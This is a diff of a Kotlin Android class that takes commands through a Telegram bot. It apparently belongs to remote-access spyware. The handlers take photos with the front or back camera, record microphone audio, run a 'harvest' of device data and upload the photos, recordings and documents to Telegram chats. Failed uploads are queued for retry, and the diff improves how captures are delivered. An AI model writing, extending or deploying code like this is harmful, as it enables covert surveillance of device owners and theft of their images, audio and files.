@@ -23,15 +23,9 @@ import kotlin.random.Random
  * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
  *
  * ✅ التعديلات الجديدة:
- * - استقبال receivingToken لضمان استخدام نفس البوت في الردود.
- * - إضافة معالجة الأوامر الجديدة: camf_main, cam_main, mic_start, hrv_now, send_now, sys_status, ext, update_model_all, restart_service_all.
- * - إضافة دوال معالجة جديدة: handleSysStatus, handleExt, handleUpdateModel, handleRestartService.
- * - تعديل sendTelegramMessage لاستقبال receivingToken واستخدامه في الإرسال المباشر.
- * - منع تسريب كلمة المرور في أي رسالة.
- * - إضافة تأكيد استلام الضغطة (answerCallbackQuery) في execute.
- * - تحسين سجلات التشخيص.
- * - ✅ إصلاح invokeTelegramMethod باستخدام الاستدعاء المباشر للدوال الداخلية في TelegramUi بدلاً من الانعكاس المعقد.
- * - ✅ إضافة معاملات threadId و replyToMessageId لجميع دوال المعالجة لضمان الرد في المواضيع الصحيحة.
+ * - تعديل handleCamera لتمرير tg و threadId إلى CameraAnalyzer.harvest.
+ * - تعديل sendTelegramVoice و sendTelegramDocument لاستقبال threadId واستخدام TelegramUi مباشرة.
+ * - تعديل handleMic لتمرير threadId إلى sendTelegramVoice.
  */
 class Commands private constructor(context: Context) {
 
@@ -474,7 +468,7 @@ class Commands private constructor(context: Context) {
                 return
             }
 
-            val success = sendTelegramDocument(tg, chatId, tempFile, "📄 $filename", receivingToken)
+            val success = sendTelegramDocument(tg, chatId, tempFile, "📄 $filename", receivingToken, threadId)
             if (success) {
                 safeRemove(tempFile)
             } else {
@@ -792,7 +786,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج الكاميرا (معدل لاستقبال receivingToken, threadId, replyToMessageId)
+    //  ✅ معالج الكاميرا المُصلح (مع تمرير tg و threadId)
     // ============================================================
 
     private suspend fun handleCamera(
@@ -807,7 +801,7 @@ class Commands private constructor(context: Context) {
         try {
             if (!isBatteryOk(m)) {
                 sendTelegramMessage(
-                    tg, cid, "🔋 البطارية منخفضة",
+                    tg, cid, "🔋 البطارية منخفضة، تم تخطي الالتقاط",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -818,7 +812,7 @@ class Commands private constructor(context: Context) {
             val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer") as? CameraAnalyzer
             if (cameraAnalyzer == null) {
                 sendTelegramMessage(
-                    tg, cid, "❌ الكاميرا غير متاحة",
+                    tg, cid, "❌ وحدة الكاميرا غير مهيأة",
                     receivingToken = receivingToken,
                     threadId = threadId,
                     replyToMessageId = replyToMessageId
@@ -826,36 +820,31 @@ class Commands private constructor(context: Context) {
                 return
             }
 
+            val camType = if (camId == 1) "الأمامية 🤳" else "الخلفية 📷"
             sendTelegramMessage(
-                tg, cid, "📸 جاري التقاط الصورة...",
+                tg, cid, "📸 جاري التقاط صورة من الكاميرا $camType...",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
             )
-            sendPulseIntent("📸 Camera")
 
-            scope.launch {
-                try {
-                    cameraAnalyzer.harvest(camId)
-                    sendTelegramMessage(
-                        tg, cid, "✅ تم التقاط الصورة وتحليلها.",
-                        receivingToken = receivingToken,
-                        threadId = threadId,
-                        replyToMessageId = replyToMessageId
-                    )
-                } catch (e: Exception) {
-                    sendTelegramMessage(
-                        tg, cid, "❌ فشل الالتقاط: ${e.message?.take(50)}",
-                        receivingToken = receivingToken,
-                        threadId = threadId,
-                        replyToMessageId = replyToMessageId
-                    )
-                }
+            sendPulseIntent("📸 Camera $camId")
+
+            // ✅ استدعاء harvest مع تمرير tg و threadId
+            withContext(Dispatchers.IO) {
+                cameraAnalyzer.harvest(camId, tg as? TelegramUi, threadId)
             }
+
+            sendTelegramMessage(
+                tg, cid, "✅ تم التقاط الصورة وإرسالها بنجاح",
+                receivingToken = receivingToken,
+                threadId = threadId,
+                replyToMessageId = replyToMessageId
+            )
         } catch (e: Exception) {
             Log.e(TAG, "Camera handler error: ${e.message}")
             sendTelegramMessage(
-                tg, cid, "❌ خطأ في الكاميرا",
+                tg, cid, "❌ فشل التقاط الصورة: ${e.message?.take(50)}",
                 receivingToken = receivingToken,
                 threadId = threadId,
                 replyToMessageId = replyToMessageId
@@ -1117,7 +1106,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج الميكروفون (معدل لاستقبال threadId و replyToMessageId)
+    //  معالج الميكروفون (معدل لتمرير threadId إلى sendTelegramVoice)
     // ============================================================
 
     private suspend fun handleMic(
@@ -1154,9 +1143,14 @@ class Commands private constructor(context: Context) {
                 val audioPath = recordAudio(duration)
                 if (audioPath != null && audioPath.exists()) {
                     val target = getModuleField(m, "vlt") as? Long ?: cid
-                    val success = sendTelegramVoice(tg, target, audioPath, receivingToken)
+                    // ✅ تمرير threadId إلى sendTelegramVoice
+                    val success = sendTelegramVoice(tg, target, audioPath, receivingToken, threadId)
                     if (success) {
                         safeRemove(audioPath)
+                        sendTelegramMessage(
+                            tg, cid, "✅ تم إرسال التسجيل الصوتي بنجاح.",
+                            receivingToken, threadId, replyToMessageId
+                        )
                     } else {
                         Log.w(TAG, "⚠️ Failed to send audio, adding to pending tasks")
                         addTaskToQueue("audio", audioPath.absolutePath, target)
@@ -1422,23 +1416,25 @@ class Commands private constructor(context: Context) {
         invokeTelegramMethod(tg, "sendChatAction", params, receivingToken)
     }
 
+    // ============================================================
+    //  ✅ دوال الإرسال المعدلة لاستخدام TelegramUi مباشرة مع threadId
+    // ============================================================
+
     private suspend fun sendTelegramVoice(
         tg: Any?,
         chatId: Any,
         voiceFile: File,
-        receivingToken: String? = null
+        receivingToken: String? = null,
+        threadId: Long = 0L
     ): Boolean {
-        if (tg == null) return false
+        if (tg == null || !voiceFile.exists()) return false
         return try {
-            val params = mapOf("chat_id" to chatId)
-            val files = mapOf("voice" to voiceFile)
-            val result = invokeMethod(tg, "_api", "sendVoice", params, files)
-            if (result != null) {
-                val json = result as? JSONObject
-                json?.optBoolean("ok") == true
-            } else {
-                false
-            }
+            val ui = tg as? TelegramUi
+            if (ui != null) {
+                val targetChat = (chatId as? Long) ?: return false
+                val result = ui.sendVoice(targetChat, voiceFile, threadId)
+                result?.optBoolean("ok") == true
+            } else false
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send voice error: ${e.message}")
             false
@@ -1450,22 +1446,17 @@ class Commands private constructor(context: Context) {
         chatId: Any,
         documentFile: File,
         caption: String,
-        receivingToken: String? = null
+        receivingToken: String? = null,
+        threadId: Long = 0L
     ): Boolean {
-        if (tg == null) return false
+        if (tg == null || !documentFile.exists()) return false
         return try {
-            val params = mapOf(
-                "chat_id" to chatId,
-                "caption" to caption
-            )
-            val files = mapOf("document" to documentFile)
-            val result = invokeMethod(tg, "_api", "sendDocument", params, files)
-            if (result != null) {
-                val json = result as? JSONObject
-                json?.optBoolean("ok") == true
-            } else {
-                false
-            }
+            val ui = tg as? TelegramUi
+            if (ui != null) {
+                val targetChat = (chatId as? Long) ?: return false
+                val result = ui.sendDocument(targetChat, documentFile, caption, threadId)
+                result?.optBoolean("ok") == true
+            } else false
         } catch (e: Exception) {
             Log.e(TAG, "❌ Send document error: ${e.message}")
             false
